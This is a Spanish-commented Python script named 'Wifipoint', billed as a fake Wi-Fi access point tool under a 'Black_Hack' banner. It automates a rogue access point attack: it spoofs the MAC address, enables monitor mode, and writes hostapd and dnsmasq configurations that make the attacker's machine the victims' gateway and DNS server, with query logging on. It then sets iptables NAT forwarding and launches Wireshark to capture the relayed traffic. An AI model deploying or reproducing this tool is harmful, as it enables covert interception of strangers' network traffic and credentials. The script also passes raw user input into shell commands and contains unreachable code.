#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ LIBRERIAS $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
import os, subprocess, time, threading

# Programador David soto noche
# Correo: Sotodelanoche@gmail.com
# Lenguaje Python3 scrispt 
# Fecha 08:05:2020:
# Nombre del programa : Wifipoint
# Accion Acceso falso wifi 

#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ PRESENTACION TERMINAL $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
os.system('clear')
print("\033[1;31;1m ")
os.system('figlet -k -f usr/font/cosmike "   		Smp_A" && figlet -k -f usr/font/bulbhead " 						 WiFiPoint"')
print("			  		Black_Hack")                 	
print("\033[1;37;1m ")
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ FUNCIONES PRINCIPALES $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Variables ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
listamenu=["opciones:","1--seleccion Wlan","2--Configurar hostapd y dnsmasq","3--wireshark","4--Exit" ,"Selec options: "]#Menu Princcipal
key=0
exit=False
wlan=""
name_Wifi=""
channel=""
banda=""
server=""
ip_rango_minimo_dhcp=""
ip_rango_maximo_dhcp=""
ip_gateway=""
Wlan_Eth=""
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ OPciones MEnu ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def menu():
	print("     "+listamenu[0])
	print(listamenu[1])
	print(listamenu[2])
	print(listamenu[3])
	print(listamenu[4])
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Funcion principal $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Funcion wifi ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def selec_wlan(wlan):
	while True:
		try:
			global wlanmon
			global ip_wifi
			M_monitor=input("Activar modo monitor Y o N ")
			print("")
			wlan=input("Introduzca Wlan: ")
			ip_wifi=input("Input ip Wlan: ")
			os.system('ifconfig '+wlan+' '+ip_wifi+' netmask 255.255.255.0')
			time.sleep(0.5)
			wlanmon=wlan
			print("")
			print("Procesando")
			os.system('ifconfig '+wlan+' down') 
			os.system('macchanger -A '+wlan) 
			os.system('ifconfig '+wlan+' up')
			if(M_monitor=="Y"):
				os.system('airmon-ng check kill')
				time.sleep(0.5)
				os.system('airmon-ng start '+wlan)
				if(wlanmon!=wlan+"mon"):
					wlanmon=wlan+"mon"
				#elif(wlanmon!=wlan+"monmon"):
					#wlanmon=wlan+"mon"
					#os.system('airmon-ng stop '+wlanmon) airmon-ng en kali 2020.1 bug monmon complementar condicion con == monmomn si sufres bug 		
			print(wlanmon)					
			return wlanmon 
			return ip_wifi 
			break
		except TypeError:
			print("No es tipo de variable intetelo de nuevo")
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ CONFIGURACION DE ARCHIVOS CONF $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ hostapd ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

def configurar_Hostapd(wlanmon,name_Wifi,banda,channel):
	while True:
		try:
			print("la interfaz fue configurada como "+ wlanmon)
			print("Introduzca los siguientes datos: ")
			name_Wifi=input("Input Name Fake point Wifi: ")
			channel=input("Input channel: ")
			banda=input("Input banda the working G/A/B/N: ")
			file1 = open("hostapd.conf","w")
			time.sleep(0.3)
			file1.write('interface='+wlanmon+'\n')
			file1.write('driver=nl80211'+'\n')
			file1.write('ssid='+name_Wifi+'\n')
			file1.write('hw_mode='+banda+'\n')
			file1.write('channel='+channel+'\n')
			file1.write('macaddr_acl=0'+'\n')
			file1.write('auth_algs=1'+'\n')
			file1.write('ignore_broadcast_ssid=0'+'\n')
			file1.close()
			time.sleep(1)
			subprocess.call('x-terminal-emulator -e hostapd hostapd.conf', shell=True)
			break
		except TypeError:
			print("No es tipo de variable intetelo de nuevo")

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$  CONFIGURACION DE ARCHIVOS CONF $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ dnsmasq ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def configurar_dnsmasq(wlanmon,server):
	while True:
		try:
			print("la interfaz fue configurada como "+ wlanmon)
			server=input("Seleccione servidor: ")
			ip_rango_minimo_dhcp=input("Input ip DHCP minimo: ")
			ip_rango_maximo_dhcp=input("Input ip DHCP maximo: ")
			file2 = open("dnsmasq.conf","w")
			file2.write('interface='+wlanmon+'\n')
			file2.write('dhcp-range='+ip_rango_minimo_dhcp+','+ip_rango_maximo_dhcp+',255.255.255.0,12h'+'\n')
			file2.write('dhcp-option=3,'+ip_wifi+'\n')
			file2.write('dhcp-option=6,'+ip_wifi+'\n')
			file2.write('server='+server+'\n')
			file2.write('log-queries'+'\n')
			file2.write('log-dhcp'+'\n')
			file2.write('listen-address=127.0.0.1'+'\n')
			time.sleep(1)
			subprocess.call('x-terminal-emulator -e dnsmasq -C dnsmasq.conf -d', shell=True)		
			break
		except TypeError:
			print("No es tipo de variable intetelo de nuevo")
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Configuracion de enrutamiento $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ruting Iptables ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def enrutamiento(wlanmon,ip_wifi):
	while True:
		try:
			ip_gateway=input("Input ip gateway(P.enlace): ")
			config_wlan_eth=input("Introduzca connfirmacion Y = wlan N = eth0:")
			wlan1="eth0"
			
			if(config_wlan_eth=="Y"):
				wlan1=input("Input name wifi gateway: ")
				print("")
				print("Procesando")
				os.system('ifconfig '+wlan1+' down') 
				os.system('macchanger -A '+wlan1) 
				os.system('ifconfig '+wlan1+' up')

			print("configurando enrutamiento de interfaz"+ wlanmon)
			time.sleep(0.1)
			os.system('route add -net '+ip_gateway+' netmask 255.255.255.0 gw '+ip_wifi)
			print("configuracion de enrutamiento terminada")
			print("")
			print("comprobacion ruting")
			print("")
			os.system('route')
			print("configurando iptables") 
			os.system('iptables -F')
			os.system('iptables -X')
			os.system('iptables -Z')
			os.system('iptables -t nat -L')	
			os.system('iptables -P FORWARD ACCEPT')
			os.system('iptables --table nat --append POSTROUTING --out-interface '+wlan1+' -j MASQUERADE') 
			os.system('iptables --append FORWARD --in-interface '+wlanmon+' -j ACCEPT')
			os.system('echo "1" > /proc/sys/net/ipv4/ip_forward')
			os.system('iptables-save > /etc/iptables.up.rules')
			print("configuracion iptables terminada")
			time.sleep(0.5)
			print("")
			print("configuracion comprobacion iptables")
			os.system('iptables -L')
			break
		except TypeError:
			print("No es tipo de variable intetelo de nuevo")
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU DE EJECUCION $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EJECUCION DEL PROGRAMA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
while exit==False:
	menu()
	key=(int(input()))
	if (key==1):
		selec_wlan(wlan)
		time.sleep(0.1)
		enrutamiento(wlanmon,ip_wifi)
	elif (key==2):
		configurar_Hostapd(wlanmon,name_Wifi,banda,channel)
		time.sleep(2)
		configurar_dnsmasq(wlanmon,server)
	elif (key==3):
		os.system('wireshark')
	elif (key==4):		
		os.system('airmon-ng stop '+wlanmon)
		os.system('service network-manager restart')
		exit=True	